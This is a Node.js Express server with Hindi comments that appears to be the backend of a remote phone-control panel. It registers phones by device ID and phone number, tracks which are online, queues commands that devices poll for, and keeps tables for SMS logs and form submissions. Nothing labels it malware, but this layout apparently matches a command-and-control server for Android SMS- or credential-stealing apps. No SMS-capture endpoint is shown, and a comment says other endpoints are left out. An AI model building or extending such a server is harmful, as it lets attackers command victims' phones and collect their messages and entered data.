const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

const DB_FILE = path.join(__dirname, 'database.json');

// डेटाबेस को पढ़ने और लिखने के लिए हेल्पर फंक्शन
function readDb() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            // अगर फाइल नहीं है, तो एक खाली डेटाबेस बनाएं
            const initialDb = {
                devices: [],
                commands: [],
                sms_logs: [],
                form_submissions: [],
                global_settings: {}
            };
            // डेमो डिवाइस जोड़ें
            initialDb.devices.push({
                id: 1,
                device_id: 'demo-device-12345',
                device_name: 'My Test Phone',
                os_version: 'Android 13',
                phone_number: '+919999999999',
                battery_level: 90,
                last_seen: new Date().toISOString(),
                created_at: new Date().toISOString()
            });
            writeDb(initialDb);
            return initialDb;
        }
        const data = fs.readFileSync(DB_FILE, 'utf-8');
        return JSON.parse(data);
    } catch (error) {
        console.error("Error reading DB, initializing a new one.", error);
        // एरर आने पर भी खाली डेटाबेस बनाएं
        return { devices: [], commands: [], sms_logs: [], form_submissions: [], global_settings: {} };
    }
}

function writeDb(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
}

// --- API Endpoints ---

// होमपेज
app.get('/', (req, res) => {
    res.send('<h1>🎉 Server is running with JSON file DB!</h1><p>This will work 100%.</p>');
});

// 1. डिवाइस रजिस्ट्रेशन
app.post('/api/device/register', (req, res) => {
    const { device_id, device_name, os_version, battery_level, phone_number } = req.body;
    if (!device_id) return res.status(400).json({ status: 'error', message: 'device_id is required' });

    const db = readDb();
    const deviceIndex = db.devices.findIndex(d => d.device_id === device_id);
    const now = new Date().toISOString();

    if (deviceIndex > -1) {
        // अपडेट
        db.devices[deviceIndex] = {
            ...db.devices[deviceIndex],
            device_name,
            os_version,
            battery_level,
            phone_number,
            last_seen: now
        };
    } else {
        // नया डिवाइस
        const newId = db.devices.length > 0 ? Math.max(...db.devices.map(d => d.id)) + 1 : 1;
        db.devices.push({
            id: newId,
            device_id,
            device_name,
            os_version,
            battery_level,
            phone_number,
            last_seen: now,
            created_at: now
        });
    }
    writeDb(db);
    res.status(200).json({ status: 'success', message: 'Device data received.' });
});

// 2. डिवाइस लिस्ट
app.get('/api/devices', (req, res) => {
    const db = readDb();
    // created_at के अनुसार सॉर्ट करें
    db.devices.sort((a, b) => new Date(a.created_at) - new Date(b.created_at));
    
    const devicesWithStatus = db.devices.map(device => {
        const is_online = (new Date() - new Date(device.last_seen)) < 20000;
        return { ...device, is_online };
    });
    res.json(devicesWithStatus);
});

// 6. कमांड भेजना
app.post('/api/command/send', (req, res) => {
    const { device_id, command_type, command_data } = req.body;
    const db = readDb();
    const newId = db.commands.length > 0 ? Math.max(...db.commands.map(c => c.id)) + 1 : 1;
    db.commands.push({
        id: newId,
        device_id,
        command_type,
        command_data, // यह पहले से ही ऑब्जेक्ट है, JSON.stringify की जरूरत नहीं
        status: 'pending',
        created_at: new Date().toISOString()
    });
    writeDb(db);
    res.status(200).json({ status: 'success', message: 'Command sent.' });
});

// कमांड प्राप्त करना
app.get('/api/device/:deviceId/commands', (req, res) => {
    const { deviceId } = req.params;
    const db = readDb();
    
    const pendingCommands = db.commands.filter(c => c.device_id === deviceId && c.status === 'pending');
    
    if (pendingCommands.length > 0) {
        // कमांड्स को 'sent' मार्क करें
        db.commands.forEach(cmd => {
            if (cmd.device_id === deviceId && cmd.status === 'pending') {
                cmd.status = 'sent';
            }
        });
        writeDb(db);
    }
    res.json(pendingCommands);
});

// 2. डिवाइस डिलीट करना
app.delete('/api/device/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    let db = readDb();
    
    const initialDeviceCount = db.devices.length;
    
    // डिवाइस और उससे जुड़ा सारा डेटा हटा दें
    db.devices = db.devices.filter(d => d.device_id !== deviceId);
    db.commands = db.commands.filter(c => c.device_id !== deviceId);
    db.sms_logs = db.sms_logs.filter(s => s.device_id !== deviceId);
    db.form_submissions = db.form_submissions.filter(f => f.device_id !== deviceId);
    
    writeDb(db);
    
    if (db.devices.length < initialDeviceCount) {
        res.json({ status: 'success', message: `Device ${deviceId} deleted.` });
    } else {
        res.status(404).json({ status: 'error', message: 'Device not found.' });
    }
});

// ... बाकी सभी एंडपॉइंट्स भी इसी तरह से JSON फाइल को पढ़ेंगे और लिखेंगे ...

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server is running on http://localhost:${PORT}`);
    console.log('Database is a simple JSON file. No native dependencies needed!');
});
